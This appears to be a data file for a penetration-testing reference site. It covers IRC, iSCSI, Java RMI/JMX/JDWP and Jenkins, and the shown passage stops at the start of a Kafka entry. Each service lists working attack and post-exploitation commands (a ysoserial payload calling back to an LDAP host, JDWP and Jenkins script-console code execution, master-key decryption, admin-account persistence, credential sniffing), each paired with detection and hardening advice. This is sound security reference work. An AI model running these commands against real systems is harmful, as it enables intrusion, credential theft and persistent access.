export const services = [
  {
    slug: "irc",
    name: "IRC",
    port: 6667,
    protocol: "tcp",
    risk: "medium",
    tags: ["chat", "legacy", "cleartext"],
    summary:
      "IRC is a line-based text chat protocol that still underpins plenty of internal tooling, from release bots to incident rooms. It was designed for a trusted network, so the transport is plaintext, accounts are optional and channels are usually open to anyone who speaks the protocol. An exposed server therefore acts as a listening post for internal conversation and, once an attacker has a foothold, as a convenient command-and-control channel. Enumeration takes only a handful of lines of netcat.",
    connect: [
      {
        label: "irssi",
        command: "irssi -c <target> -p 6667 -n <nick>",
        detail:
          "A full client is worth the extra minute because it handles the numeric replies and the MOTD for you, and because it keeps a session log you can search later.",
      },
      {
        label: "Raw netcat",
        command: "printf 'NICK recon\\r\\nUSER recon 0 * :recon\\r\\n' | nc -nv <target> 6667",
        detail:
          "The server replies with numeric replies 001 to 005, which carry the version, the available commands and the supported channels. That reply is the fingerprint.",
      },
      {
        label: "TLS listener",
        command: "openssl s_client -connect <target>:6697 -quiet",
        detail:
          "Many servers now also listen on 6697 for IRC over TLS. If that port answers, prefer it — everything on 6667 is readable by anyone on the path.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 6667 --script irc-info <target>",
        detail:
          "The irc-info script reads the welcome sequence and reports the server version, the host it believes it is and whether the server is reachable. An empty version usually means the server is hiding its banner.",
      },
      {
        title: "Identify the software",
        command: "printf 'NICK recon\\r\\nUSER recon 0 * :recon\\r\\n' | nc -nv <target> 6667 | head -20",
        detail:
          "Look for the 004 numeric reply, whose parameters name the server software and the version. IRCd implementations differ enough that the string alone tells you which hardening options apply.",
      },
      {
        title: "Look for the TLS sibling",
        command: "nmap -sV -p 6667,6697,7000 <target>",
        detail:
          "Common alternate ports are 6667, 6697 for TLS and 7000 for a second plain listener on some networks. Whatever is on 7000 is usually less filtered than 6667.",
      },
    ],
    enumeration: [
      {
        title: "Read the supported features",
        command: "printf 'NICK recon\\r\\nUSER recon 0 * :recon\\r\\n' | nc -nv <target> 6667 | grep -E '^(:[^ ]* 005)'",
        detail:
          "The 005 numeric reply lists ISUPPORT tokens such as CHANTYPES, PREFIX and NETWORK. The prefix modes tell you whether the server enforces +m, +n or moderated channels.",
      },
      {
        title: "List the channels",
        command: "printf 'NICK recon\\r\\nUSER recon 0 * :recon\\r\\nLIST\\r\\n' | nc -nv <target> 6667 | grep -E ' 322 | 323 '",
        detail:
          "LIST asks for every public channel. The 322 reply carries the channel name, user count and topic, which is often enough to describe the organisation's internal projects.",
      },
      {
        title: "Enumerate users in a channel",
        command: "printf 'NICK recon\\r\\nUSER recon 0 * :recon\\r\\nJOIN #<channel>\\r\\nWHO #<channel>\\r\\n' | nc -nv <target> 6667",
        detail:
          "WHO returns the nickname, host mask and channel list for each member. Host masks are valuable because they often expose internal addressing and usernames.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated channel access",
        severity: "medium",
        command:
          "printf 'NICK recon\\r\\nUSER recon 0 * :recon\\r\\nJOIN #<channel>\\r\\n' | nc -nv <target> 6667",
        detail:
          "Most servers accept a JOIN without any credential. If the channel is not marked +k or +i, an outsider can read everything that is said in it, including incident details and credentials pasted by tired engineers.",
        detection:
          "Server logs show a JOIN from a host that has never authenticated, plus a burst of WHO or NAMES requests against channels.",
        fix: "Require registered accounts, set +k on every channel and +i on restricted ones, and reject connections that have not completed ident or a services login.",
      },
      {
        title: "Credential capture on the wire",
        severity: "high",
        command:
          "sudo tcpdump -i eth0 -A -s 0 'tcp port 6667 and host <ip>' | grep -iE 'PASS |SASLPLAIN|NICK |USER '",
        detail:
          "Nothing on 6667 is encrypted. Any service password sent with NickServ, a bot token or a web panel login crosses the network in clear text, and IRC is rarely the only protocol on that host.",
        detection:
          "Network IDS rules for plaintext IRC with PASS or SASLPLAIN tokens, or an unexpected spike of authentication on the channel services.",
        fix: "Move every client and server to ircs on 6697, disable the ident protocol, and require NickServ authentication with a hashed password.",
      },
      {
        title: "Nick collision and account takeover",
        severity: "medium",
        command:
          "printf 'NICK admin\\r\\nUSER admin 0 * :admin\\r\\n' | nc -nv <target> 6667",
        detail:
          "IRC identifies a user by nickname. If services are configured loosely, taking an offline nickname of an operator or bot and answering the nick collision prompt can hand over that identity and everything it is permitted to do.",
        detection:
          "NickServ logs show repeated nick collision challenges against privileged nicknames and unexpected successful identifications from unusual hosts.",
        fix: "Enable nick collision handling for privileged nicks, expire idle registrations quickly and require a second factor of authorisation before granting operator status.",
      },
    ],
    postEx: [
      {
        title: "Harvest credentials from live traffic",
        severity: "high",
        command:
          "sudo timeout 120 tcpdump -i eth0 -A -s 0 'tcp port 6667' | grep -iE 'PASS |PRIVMSG .*(pass|token|key)'",
        detail:
          "Once you are on a segment with a client, the channel traffic itself is the payload. Watch for pasted passwords, internal URLs and the names of systems that are not in any inventory.",
        detection:
          "Endpoint telemetry on workstations that run IRC clients, plus channel-side reports of leaked credentials being rotated.",
        fix: "Treat anything typed into an IRC channel as compromised, rotate it immediately and move the channel to an encrypted transport.",
      },
      {
        title: "Use the channel as a command channel",
        severity: "medium",
        command:
          "irssi -c <target> -p 6667 -n <nick>\n/join #<channel>\n/names",
        detail:
          "Hosts that have already been compromised very often run a small IRC bot that joins a channel and accepts commands. Listing the members and their nick patterns shows whether the channel is being used that way.",
        detection:
          "Egress records showing outbound IRC from servers that have no business talking IRC, and bot nicks joining channels at unusual times.",
        fix: "Block outbound IRC at the perimeter for servers, and alert on any host that connects to an IRC server it is not registered with.",
      },
      {
        title: "Read the services database",
        severity: "low",
        command:
          "irssi -c <target> -p 6667 -n <nick>\n/msg ChanServ INFO #<channel>\n/msg NickServ INFO <nick>",
        detail:
          "ChanServ and NickServ hold the registration rules. A channel with no key, no topic enforcement and a public memo is an invitation, and the memo often names the owners and their e-mail addresses.",
        detection:
          "Services database changes that are not tied to a known administrator action.",
        fix: "Keep registration changes behind an authenticated services group and review the channel list regularly for orphaned channels.",
      },
    ],
    commands: [
      { command: "NICK <nick>", description: "Sets your nickname. The first command a server expects to see." },
      { command: "USER <user> <mode> <unused> :<realname>", description: "Completes registration and triggers the 001 to 005 welcome replies." },
      { command: "JOIN #<channel>", description: "Joins a channel. Usually no credential is needed." },
      { command: "PART #<channel>", description: "Leaves a channel you have joined." },
      { command: "PRIVMSG #<channel> :<text>", description: "Sends a message. Everything here is plaintext on the wire." },
      { command: "WHO #<channel>", description: "Lists the members of a channel with their host masks." },
      { command: "NAMES #<channel>", description: "Lists the nicknames currently present in a channel." },
      { command: "LIST", description: "Lists every public channel on the server." },
      { command: "MODE #<channel>", description: "Shows channel modes such as +k for a key or +i for invite only." },
      { command: "WHOIS <nick>", description: "Reveals a user's channels, host mask and idle time." },
    ],
    hardening: [
      {
        title: "Require registered accounts",
        detail:
          "Configure the services layer so that an unregistered client is dropped at connect time instead of being silently allowed to watch. Anonymous read access is the default problem here.",
      },
      {
        title: "Use IRC over TLS",
        detail:
          "Move clients and servers to ircs on 6697 and refuse plaintext connections on 6667 so that credentials and traffic cannot be read from the network.",
      },
      {
        title: "Lock down channel modes",
        detail:
          "Apply +k to every channel, +i to the private ones and +m where moderation is expected. Review the list periodically, because channels accumulate and keys leak.",
      },
      {
        title: "Disable identd",
        detail:
          "Turn off the ident service. It discloses host and OS information, adds a separate network dependency, and buys you nothing on a modern server.",
      },
      {
        title: "Segment the service",
        detail:
          "Keep the IRC server on an internal network segment, restrict inbound connections to known clients and log the full registration traffic for later review.",
      },
      {
        title: "Watch for rogue clients",
        detail:
          "Alert on a new nickname appearing in a restricted channel and on any host that connects from an address that has never been seen before.",
      },
    ],
    tools: ["nmap", "netcat", "irssi", "hydra", "tcpdump", "wireshark"],
  },
  {
    slug: "iscsi",
    name: "ISCSI",
    port: 3260,
    protocol: "tcp",
    risk: "high",
    tags: ["storage", "enterprise", "block-device"],
    summary:
      "iSCSI carries SCSI block commands over TCP so that a disk array can sit on a different switch from the host that mounts it. Access control is thin: the protocol supports CHAP, but many deployments run with authentication disabled and rely on network placement instead. If the initiator's secret store is readable, the whole volume is readable too, because the secret is the only thing standing between the two. This is storage where the network is the perimeter.",
    connect: [
      {
        label: "open-iscsi initiator",
        command: "iscsiadm -m discovery -t sendtargets -p <target>:3260",
        detail:
          "The initiator asks the portal for the targets it hosts. The reply contains the IQN of every target and, sometimes, the address list of the portal itself.",
      },
      {
        label: "Session login",
        command: "iscsiadm -m node -T <iqn> -p <target> --login -u <user> -w <secret>",
        detail:
          "Logging in attaches the target as a local block device. With CHAP disabled the --login call succeeds with no credential at all.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 3260 --script iscsi-info <target>",
        detail:
          "The iscsi-info script performs the iSCSI discovery exchange and reports the target name, the vendor and the version of the implementation. A target that answers with no CHAP support is a notable finding.",
      },
      {
        title: "UDP discovery",
        command: "nmap -sU -p 3260 --script iscsi-info <target>",
        detail:
          "Targets also listen on UDP 3260 for the unicast discovery broadcast. A TCP-only scan misses targets that only publish through that path.",
      },
      {
        title: "Find the management interfaces",
        command: "nmap -sV -p 3260,8999,9899 <target>",
        detail:
          "Target management daemons such as tgt and LIO sit on their own ports and often carry their own web interface. Finding them turns a block-level problem into a management-level one.",
      },
    ],
    enumeration: [
      {
        title: "Enumerate the targets",
        command: "iscsiadm -m discovery -t sendtargets -p <target>:3260",
        detail:
          "Each entry gives the TargetName (IQN) and the portal address. The IQN encodes the vendor and sometimes the hostname, which is a free naming hint for the storage owner.",
      },
      {
        title: "Read the local node records",
        command: "iscsiadm -m node -o show",
        detail:
          "On an initiator host this prints the IQN, the portal addresses, the authentication method and whether the node is set to log in automatically at boot.",
      },
      {
        title: "Inspect the credential store",
        command: "sudo cat /etc/iscsi/secret",
        detail:
          "The initiator keeps CHAP usernames and secrets in this file in clear text. If you have read access to an initiator host at all, this is the file that turns a local read into a storage compromise.",
      },
    ],
    attacks: [
      {
        title: "Credential theft from the initiator secret store",
        severity: "high",
        command: "sudo cat /etc/iscsi/secret",
        detail:
          "A path traversal bug, a leaked container image or a readable backup that exposes /etc/iscsi/secret hands over the CHAP credential for the array. From there the volume is just another disk.",
        detection:
          "Reads of /etc/iscsi/secret outside of the storage tooling, and successful iSCSI logins from a host that is not a registered initiator.",
        fix: "Store the credential in a secret manager and inject it at boot, keep the secret file readable only by the storage service account, and rotate CHAP secrets on a schedule.",
      },
      {
        title: "Login to a target with CHAP disabled",
        severity: "critical",
        command:
          "iscsiadm -m node -T <iqn> -p <target> --login\niscsiadm -m session -P 1",
        detail:
          "Targets configured with authentication set to None accept any initiator. The session attaches the volume and the host now has a raw disk device to read, copy or modify.",
        detection:
          "iSCSI target logs showing logins with no authentication method, or initiators that are not in the target's allowed list.",
        fix: "Require CHAP on every target, bind logins to known initiator IQNs with target ACLs, and never expose 3260 beyond the storage VLAN.",
      },
      {
        title: "Traffic interception of an unencrypted session",
        severity: "medium",
        command:
          "sudo tcpdump -i eth0 -s 0 -w iscsi.pcap 'tcp port 3260'\nsudo tshark -r iscsi.pcap -Y 'iscsi' -T fields -e iscsi.opcode -e iscsi.data",
        detail:
          "CHAP protects the secret from being replayed, but the payload itself is not encrypted. Anyone on the path can capture the block data, including a database volume in clear text.",
        detection:
          "Large sustained block transfers to hosts that are not registered initiators, and capture point reviews for bulk traffic on 3260.",
        fix: "Enable CHAP with AES-128 key exchange so session keys are negotiated, and where the data must be protected, add host based encryption or a dedicated storage fabric.",
      },
    ],
    postEx: [
      {
        title: "Mount the stolen volume",
        severity: "critical",
        command:
          "sudo iscsiadm -m node -T <iqn> -p <target> --login\nlsblk\nsudo mount /dev/sdb /mnt/iscsi\nls -la /mnt/iscsi",
        detail:
          "Once the session is attached you own a filesystem. Databases, virtual machine images and backup catalogues all sit on these volumes and all decrypt into readable files.",
        detection:
          "Target logs recording a session that was not initiated by a known host, and mount activity on the array from unexpected initiators.",
        fix: "Target ACLs limited to registered initiator IQNs, CHAP with strong secrets, and monitoring of session start events against the initiator inventory.",
      },
      {
        title: "Image the volume for offline review",
        severity: "high",
        command: "sudo dd if=/dev/sdb of=/tmp/disk.img bs=4M status=progress",
        detail:
          "A raw image lets you search the whole volume for credentials and configuration without touching the live filesystem, which keeps the intrusion quieter and the evidence intact.",
        detection:
          "Sustained sequential reads on the storage path that exceed the normal backup pattern, and volume snapshot activity outside business hours.",
        fix: "Encrypt volumes with keys held outside the array, log and review snapshot creation, and limit initiator access to the volumes each host truly needs.",
      },
      {
        title: "Recover keys and secrets from the volume",
        severity: "medium",
        command:
          "sudo grep -rE 'BEGIN (RSA |OPENSSH )?PRIVATE KEY' /mnt/iscsi/etc 2>/dev/null | head\nsudo grep -rE 'password|secret|api_key' /mnt/iscsi/etc 2>/dev/null | head",
        detail:
          "Volume images almost always contain application configuration, SSH keys and database credentials that were stored on the filesystem rather than in a secret manager.",
        detection:
          "Credential reuse from the storage tier into unrelated systems, which shows up as logins from hosts that never had the credential.",
        fix: "Keep secrets out of images and configuration files, use a secret manager, and rotate anything that has ever been written to a volume.",
      },
    ],
    commands: [
      { command: "iscsiadm -m discovery -t sendtargets -p <target>:3260", description: "Lists the targets the portal advertises." },
      { command: "iscsiadm -m node -T <iqn> -p <target> --login", description: "Attaches the target to the initiator." },
      { command: "iscsiadm -m node -T <iqn> -p <target> --logout", description: "Detaches the session." },
      { command: "iscsiadm -m node -T <iqn> -p <target> --login -u <user> -w <secret>", description: "Logs in with a CHAP credential." },
      { command: "iscsiadm -m session", description: "Shows active sessions, portals and negotiated parameters." },
      { command: "iscsiadm -m node -o show", description: "Prints the local node records including the authentication method." },
      { command: "iscsiadm -m node -T <iqn> -p <target> --op update -n node.startup -v automatic", description: "Makes the initiator log in automatically at boot." },
      { command: "cat /etc/iscsi/secret", description: "Local CHAP credentials, stored in clear text." },
      { command: "targetcli ls", description: "Lists the targets configured on a target host." },
      { command: "tgtadm --lld iscsi --mode target --op show", description: "Shows the targets known to tgt." },
    ],
    hardening: [
      {
        title: "Always require CHAP",
        detail:
          "Set authentication to CHAP for every target and enable the AES-128 key exchange so the session key is negotiated rather than derived from a weak hash.",
      },
      {
        title: "Bind logins to known initiators",
        detail:
          "Use target ACLs and initiator node ACLs so that only registered IQNs can log in. Network segmentation alone is a control that will be tested eventually.",
      },
      {
        title: "Keep the secret out of the image",
        detail:
          "Do not bake /etc/iscsi/secret into a container image or a golden AMI. Fetch the credential at boot from a secret manager and keep the file readable only by the service account.",
      },
      {
        title: "Isolate the storage network",
        detail:
          "Put iSCSI on a dedicated VLAN with no route to user networks. The storage array should never be reachable from a general purpose subnet.",
      },
      {
        title: "Audit the target logs",
        detail:
          "Enable and centralise the target's event log so that logins, logouts and failed authentications are reviewed rather than sitting on the appliance.",
      },
      {
        title: "Encrypt sensitive volumes",
        detail:
          "Where the data must be protected from anyone with array access, encrypt it with keys held outside the array, and treat the initiator host as part of the trust boundary.",
      },
    ],
    tools: ["nmap", "iscsiadm", "targetcli", "netcat", "tcpdump", "metasploit"],
  },
  {
    slug: "java-rmi-jmx-jdwp",
    name: "Java RMI / JMX / JDWP",
    port: 1099,
    protocol: "tcp",
    risk: "critical",
    tags: ["java", "jvm", "deserialization"],
    summary:
      "The Java remote interfaces are a family of protocols that let one JVM call objects inside another. The RMI registry on 1099 advertises remote objects, JMX exposes management beans, and the debug agent known as JDWP gives full control of a running JVM. None of them are designed to face an untrusted network, and the most common failure is a Java deserialization gadget chain turning a lookup into code execution. Port 1099 is the registry; JMX agents and JDWP normally listen on their own ports, so a careful sweep is worth more than a single port check.",
    connect: [
      {
        label: "JMX client",
        command: "jmxterm -t <target> -p 1099",
        detail:
          "jmxterm speaks the JMX remote API. Without credentials it will often still connect on older servers, and once inside, ls lists the entire bean tree.",
      },
      {
        label: "Registry enumeration",
        command: "nmap -p 1099 --script rmi-registry <target>",
        detail:
          "The registry script performs the JRMI handshake and reads the bound names. A single bound name is often enough to identify the application framework.",
      },
    ],
    recon: [
      {
        title: "Check the registry",
        command: "nmap -sV -p 1099 --script rmi-registry <target>",
        detail:
          "Bound names such as NamingService or a Guice style application object tell you the framework, and the registry tells you whether a service is reachable at all.",
      },
      {
        title: "Find the JMX and debug ports",
        command: "nmap -sV -p 1099,1098,9010,5005,8000,5000 <target>",
        detail:
          "JMX agents and JDWP rarely use 1099. 5005 and 8000 are the usual JDWP choices and 9010 shows up on JMX configurations that were written by hand.",
      },
      {
        title: "Probe JDWP",
        command: "printf 'JDWP-Handshake' | nc -nv <target> 5005",
        detail:
          "A JVM with the debug agent enabled answers with the same string and then suspends itself. That single reply proves the port is a debugger, not a service.",
      },
    ],
    enumeration: [
      {
        title: "Enumerate the RMI registry",
        command: "nmap -p 1099 --script rmi-registry --script-args rmi-registry.brute=true <target>",
        detail:
          "The registry dump lists every bound name and the host and port it points at. A name that is bound to a different port usually means an internal service is being proxied.",
      },
      {
        title: "List the JMX beans",
        command: "jmxterm -t <target> -p 1099\nls",
        detail:
          "The bean tree names the application stack outright: Tomcat, JBoss, WebLogic or Spring Boot each bring their own set of management beans.",
      },
      {
        title: "Check the JVM's own configuration",
        command: "jcmd <pid> VM.system_properties",
        detail:
          "On a host where you already have a shell, this prints the system properties, including credentials that were passed with -D flags or environment variables.",
      },
    ],
    attacks: [
      {
        title: "JDWP debug port to remote code execution",
        severity: "critical",
        command: "java -jar jdwp-shell.jar -s <target> -p 5005 -c \"id\"",
        detail:
          "JDWP has no authentication at all. Anyone who can reach the port can attach to the JVM, evaluate code and run commands as the service account, which on most deployments is the application itself.",
        detection:
          "The JVM logs an attach request from an unexpected address, and the host shows a debugger connection or a child process starting from the Java process.",
        fix: "Never enable JDWP in production, bind it to localhost when it is needed, and firewall the debug ports so only the developer's machine can reach them.",
      },
      {
        title: "Deserialization gadget chain through the registry",
        severity: "critical",
        command:
          "java -cp ysoserial-all.jar ysoserial.exploit.CommonsCollections6 'ldap://<ip>:1389/Exploit' > /tmp/payload.ser\nnc <target> 1099 < /tmp/payload.ser",
        detail:
          "The registry deserialises objects it receives. If the server classpath contains a gadget library such as Commons-Collections or Spring, a crafted serialized object executes code during the deserialisation step, before any method call is made.",
        detection:
          "A Java process that spawns a child shell or makes an outbound LDAP, HTTP or DNS callback immediately after a registry lookup.",
        fix: "Update the JDK and every library on the classpath, remove unused gadget libraries from the deployment, and block outbound LDAP and HTTP from the application tier.",
      },
      {
        title: "Unauthenticated JMX access",
        severity: "high",
        command:
          "jmxterm -t <target> -p 1099\nls\ninvoke java.lang:type=Runtime",
        detail:
          "Older JVMs ship with JMX authentication and integrity disabled. An attacker who reaches the agent can read every MBean, change configuration and invoke operations that the application exposes.",
        detection:
          "JMX service URLs connecting from hosts outside the management subnet, visible in the JVM logs under com.sun.management.jmxremote.",
        fix: "Enable JMX authentication with SSL, bind the agent to a management interface, and restrict reachability with host firewalling.",
      },
    ],
    postEx: [
      {
        title: "Read the environment and the secrets in it",
        severity: "critical",
        command: "java -jar jdwp-shell.jar -s <target> -p 5005 -c \"env\"",
        detail:
          "The environment of a Java service commonly holds database credentials, cloud keys and vault tokens. It is a single command to run and a single command for the defender to block.",
        detection:
          "A Java process reading its own environment after an unexpected attach, and any child process spawned from the JVM.",
        fix: "Disable debug agents in production, move secrets to a secret manager, and give the service account no shell access.",
      },
      {
        title: "Load an agent through the diagnostic command MBean",
        severity: "critical",
        command:
          "jmxterm -t <target> -p 1099\ninvoke com.sun.management:type=DiagnosticCommand vm.load_agent /tmp/agent.jar",
        detail:
          "The diagnostic command MBean can load an arbitrary Java agent into the running JVM. That agent gets the same privileges as the application and can hook anything it does.",
        detection:
          "An agent jar appearing in the temporary directory of the application host and a new diagnostic command invocation in the JMX log.",
        fix: "Require authenticated JMX sessions, restrict which MBeans are exposed, and monitor the temporary directories of Java hosts.",
      },
      {
        title: "Harvest credentials from the running process",
        severity: "high",
        command:
          "jcmd $(pgrep -f java | head -1) VM.system_properties | grep -iE 'password|secret|key'\njcmd $(pgrep -f java | head -1) VM.system_properties | grep -iE 'jdbc|datasource'",
        detail:
          "Even without a debug port, a shell on the host gives you the full property set of every JVM running there, which frequently includes connection strings with inline credentials.",
        detection:
          "jcmd and jstack invocations against production JVMs from accounts that never run Java tooling.",
        fix: "Restrict the attach mechanism with the runtime permissions file, and keep the service account separate from any account that can attach.",
      },
    ],
    commands: [
      { command: "nmap -p 1099 --script rmi-registry <target>", description: "Lists the names bound in the RMI registry." },
      { command: "printf 'JDWP-Handshake' | nc -nv <target> 5005", description: "JDWP handshake; the JVM answers with the same string and suspends." },
      { command: "jmxterm -t <target> -p 1099", description: "Opens an interactive JMX session against the server." },
      { command: "jmxterm -t <target> -p 1099 -u <user> -p <password>", description: "Opens an authenticated JMX session." },
      { command: "ls", description: "Inside jmxterm, lists every MBean the agent exposes." },
      { command: "java -cp ysoserial-all.jar ysoserial.exploit.CommonsCollections6 'ldap://<ip>:1389/Exploit' > payload.ser", description: "Builds a serialised gadget payload." },
      { command: "java -jar jdwp-shell.jar -s <target> -p 5005 -c \"id\"", description: "Runs a command on the JVM through the debug agent." },
      { command: "jcmd <pid> VM.system_properties", description: "Reads the system properties of a local JVM." },
      { command: "jps -lv", description: "Lists running JVMs with their main class and arguments." },
      { command: "ss -lntp | grep -E '1099|5005|9010'", description: "Finds the local RMI, JDWP and JMX listeners." },
    ],
    hardening: [
      {
        title: "Remove the debug agent",
        detail:
          "Never enable JDWP in production. If a developer needs it, use a tunnel on the developer's machine, because the debug protocol has no authentication at all.",
      },
      {
        title: "Isolate and authenticate JMX",
        detail:
          "Bind the JMX agent to a management interface, require authentication with SSL, and reach it only from the monitoring hosts that need it.",
      },
      {
        title: "Strip the gadget libraries",
        detail:
          "Audit the deployment for Commons-Collections, Groovy, Spring and other libraries that provide deserialisation gadgets, and remove the ones the application does not use.",
      },
      {
        title: "Filter the RPC ports",
        detail:
          "1099, 1098 and the JMX agent port must not be reachable from user networks. Only the application tier and the monitoring tier need a path to them.",
      },
      {
        title: "Run the JVM as an unprivileged user",
        detail:
          "A dedicated service account with no shell, no write access to application directories and no read access to unrelated secrets limits what any of these paths returns.",
      },
      {
        title: "Patch the platform",
        detail:
          "Keep the JDK and the application libraries current. A large share of real-world Java remote execution is a deserialisation CVE in a dependency nobody tracked.",
      },
    ],
    tools: ["nmap", "netcat", "ysoserial", "jmxterm", "jdwp-shell", "metasploit"],
  },
  {
    slug: "jenkins",
    name: "Jenkins",
    port: 8080,
    protocol: "tcp",
    risk: "high",
    tags: ["ci-cd", "web", "devops"],
    summary:
      "Jenkins is the automation server that builds, tests and deploys most of the software in a modern company. It is a web application with a Groovy scripting console, it stores credentials for every other system, and its default security posture is anonymous read access. A controller reachable from a network it does not belong on is effectively a credential vault with a web interface. Most real compromises start with reading job configuration and end with running code on the controller or on a build agent.",
    connect: [
      {
        label: "HTTP",
        command: "curl -sI http://<target>:8080/login",
        detail:
          "The response carries the X-Jenkins and X-Hudson headers, which carry the exact version. That version decides which CVEs you should expect to find.",
      },
      {
        label: "CLI",
        command: "java -jar jenkins-cli.jar -s http://<target>:8080 who-am-i",
        detail:
          "The CLI can be used over HTTP or SSH. It is useful when the web interface is locked down but the CLI endpoint has been left enabled.",
      },
    ],
    recon: [
      {
        title: "Read the version headers",
        command: "curl -sI http://<target>:8080/",
        detail:
          "X-Jenkins gives the exact release, X-Hudson and X-Jenkins-Session give the session cookie name and the crumb behaviour. Note also whether the response redirects to a login page.",
      },
      {
        title: "Check the API",
        command: "curl -s http://<target>:8080/api/json",
        detail:
          "If this returns JSON instead of a login redirect, anonymous read is enabled. That single response changes the whole assessment.",
      },
      {
        title: "Check the sibling port",
        command: "nmap -sV -p 8080,8443,50000,8009 <target>",
        detail:
          "8443 is the common HTTPS port, 50000 is the CLI over TCP and 8009 is the legacy agent port. Each one needs its own check.",
      },
    ],
    enumeration: [
      {
        title: "List the jobs",
        command: "curl -s 'http://<target>:8080/api/json?tree=jobs[name,url,color]'",
        detail:
          "The job list names the systems being built, the teams that own them and the branch names in use. It is a map of the internal engineering organisation.",
      },
      {
        title: "Get a CSRF crumb",
        command: "curl -s http://<target>:8080/crumbIssuer/api/json",
        detail:
          "Any POST to Jenkins needs a crumb and a session. Getting one without authenticating is itself a finding, because it means the session model is not doing its job.",
      },
      {
        title: "Check the installed plugins",
        command: "curl -s 'http://<target>:8080/pluginManager/api/json?depth=1' | head -c 2000",
        detail:
          "Plugin versions are what actually matter for vulnerability research, because most Jenkins CVEs live in a plugin rather than the core.",
      },
    ],
    attacks: [
      {
        title: "Anonymous access to jobs and build logs",
        severity: "high",
        command: "curl -s 'http://<target>:8080/api/json?tree=jobs[name]'",
        detail:
          "When anonymous read is on, anyone can read job configuration, workspace files and full build logs. Build logs are a favourite place for engineers to print a token while debugging a deployment.",
        detection:
          "Access log entries for /api/json, /job/*/consoleText or /view/* from hosts that are not the build infrastructure.",
        fix: "Turn off anonymous read, require a security realm, and give anonymous users no Overall/Read permission at all.",
      },
      {
        title: "Groovy script console to remote code execution",
        severity: "critical",
        command:
          "curl -s http://<target>:8080/crumbIssuer/api/json -c /tmp/jk\ncurl -s -b /tmp/jk -X POST http://<target>:8080/scriptText --data-urlencode 'script=println(\"id\".execute().text)'",
        detail:
          "The script console evaluates Groovy on the controller with the controller's own privileges. That is code execution as the Jenkins service account, with the master key on disk one file read away.",
        detection:
          "POST requests to /scriptText or /script, and a Groovy process that spawns a child process on the controller.",
        fix: "Restrict the script console to administrators, use the script approval step for pipeline code, and run the controller with a restricted account inside a container.",
      },
      {
        title: "Credential extraction from build logs",
        severity: "medium",
        command:
          "curl -s 'http://<target>:8080/job/<job>/lastBuild/consoleText' | grep -iE 'password|token|secret|api[_-]?key'",
        detail:
          "Even where the API is locked down, a build log that anyone can read leaks whatever the pipeline printed. The same log often contains internal endpoints that map the rest of the estate.",
        detection:
          "Bulk reads of consoleText endpoints, which look different from a normal build job in the access log.",
        fix: "Review pipeline output for printed secrets, route logs to a restricted store, and rotate anything that was ever echoed by a build.",
      },
    ],
    postEx: [
      {
        title: "Read and decrypt the stored credentials",
        severity: "critical",
        command:
          "curl -s -b /tmp/jk -X POST http://<target>:8080/scriptText --data-urlencode 'script=println(new File(\"/var/jenkins_home/secrets/master.key\").text)'\ncurl -s -b /tmp/jk -X POST http://<target>:8080/scriptText --data-urlencode 'script=println(hudson.util.Secret.decrypt(\"<base64-value>\"))'",
        detail:
          "Jenkins encrypts credentials with a master key in $JENKINS_HOME/secrets. Read the key and every stored credential becomes readable, which is usually the fastest way to reach the rest of the company.",
        detection:
          "Reads of the secrets directory and decrypt calls appearing in the script console audit log.",
        fix: "Rotate the master key and every credential it protected, move credentials to a vault, and restrict the script console to a very small group.",
      },
      {
        title: "Run commands on the controller",
        severity: "critical",
        command:
          "curl -s -b /tmp/jk -X POST http://<target>:8080/scriptText --data-urlencode 'script=new ProcessBuilder(\"id\").start().text.each{println it}'",
        detail:
          "Anything the script console can do runs as the Jenkins user on the controller. From there it is a short step to the master key, the agent configuration and the network around it.",
        detection:
          "Child processes appearing under the Jenkins process, and script console activity outside an administrative change window.",
        fix: "Keep the controller isolated, run it as a non-root user with a read-only filesystem where possible, and log script console use.",
      },
      {
        title: "Create a persistent administrator",
        severity: "critical",
        command:
          "curl -s -b /tmp/jk -X POST http://<target>:8080/scriptText --data-urlencode 'script=def u=hudson.model.User.getById(\"<user>\",true); u.addProperty(new hudson.security.HudsonPrivateSecurityRealm.Details(\"<password>\")); u.save()'",
        detail:
          "Adding an account gives the attacker a durable way back in that survives a controller restart and a job cleanup.",
        detection:
          "New user accounts created outside the identity provider, and sign-ins from addresses that never appeared before.",
        fix: "Use single sign-on, disallow local accounts, and alert on any change to the user list.",
      },
    ],
    commands: [
      { command: "curl -sI http://<target>:8080/", description: "Returns the X-Jenkins and X-Hudson version headers." },
      { command: "curl -s http://<target>:8080/api/json", description: "The JSON API, which works unauthenticated when anonymous read is on." },
      { command: "curl -s 'http://<target>:8080/api/json?tree=jobs[name,url]'", description: "Lists the jobs and their URLs." },
      { command: "curl -s http://<target>:8080/crumbIssuer/api/json", description: "Returns a CSRF crumb needed for POST requests." },
      { command: "curl -s http://<target>:8080/cli/whoAmI", description: "The HTTP CLI reports the current identity." },
      { command: "curl -s 'http://<target>:8080/job/<job>/lastBuild/consoleText'", description: "Downloads the full log of the last build." },
      { command: "curl -s -X POST http://<target>:8080/scriptText --data-urlencode 'script=println(\"id\".execute().text)'", description: "Evaluates Groovy on the controller." },
      { command: "java -jar jenkins-cli.jar -s http://<target>:8080 who-am-i", description: "The Jenkins CLI client." },
      { command: "curl -s 'http://<target>:8080/pluginManager/api/json?depth=1'", description: "Lists installed plugins and their versions." },
      { command: "curl -s http://<target>:8080/manage", description: "The management page, which answers 403 once it is locked down." },
    ],
    hardening: [
      {
        title: "Turn off anonymous access",
        detail:
          "Untick the anonymous read permission and disable self-service signup. Most real Jenkins compromises start from the default of letting anyone read the job list.",
      },
      {
        title: "Use a real identity provider",
        detail:
          "Federate authentication, map groups to a matrix authorisation scheme and remove local password accounts entirely.",
      },
      {
        title: "Require CSRF protection and API tokens",
        detail:
          "Keep crumb issuer and API token protection enabled so that a stolen session cookie alone is not enough to make changes.",
      },
      {
        title: "Restrict the Groovy console",
        detail:
          "Remove or restrict the script console, require script approval for pipeline code and review who is in the administrator group.",
      },
      {
        title: "Isolate the controller",
        detail:
          "Run the controller in a container with a read-only filesystem, no Docker socket and no host network access. Do not expose 8080 to the internet.",
      },
      {
        title: "Rotate what the controller has seen",
        detail:
          "Credentials live encrypted on disk, so treat the controller as a secret store. Rotate anything that has ever been stored there and prefer a vault with short lived tokens.",
      },
    ],
    tools: ["nmap", "curl", "jenkins-cli", "burpsuite", "nikto", "metasploit"],
  },
  {
    slug: "kafka",
